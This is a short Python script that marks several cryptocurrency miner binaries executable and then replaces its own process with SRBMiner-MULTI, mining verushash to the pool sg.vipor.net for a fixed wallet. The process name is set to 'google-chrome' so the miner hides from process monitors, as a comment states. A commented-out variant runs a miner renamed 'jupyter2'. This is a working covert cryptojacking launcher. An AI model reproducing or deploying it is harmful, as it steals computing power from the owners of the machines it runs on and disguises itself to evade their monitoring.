import os
import random
os.system("chmod +x SRBMiner-MULTI hellminer verus-solver hell.sh verus-solver-original jupyter2")

#os.system("bash hell.sh")


name = random.randint(2000,9000)
# Replace the current process with the mining process
# os.execvp("./jupyter2", [
#     "google-chrome",  # This will be the name shown in process monitors
#     "-a", "verush",
#     "--url", "stratum+tcp://us.vipor.net:5040",
#     "-u", f"RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.aaa{name}",
#     "-p", "d=0.1",
#     "-t", "50"
# ])

os.execvp("./SRBMiner-MULTI",  [
    "google-chrome",
    "--disable-gpu",
    "--algorithm", "verushash",
    "--pool", "sg.vipor.net:5040",
    "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
    "--worker", f"aaa{name}", 
    "--password", "solo",
    "--cpu-threads", "4"
])
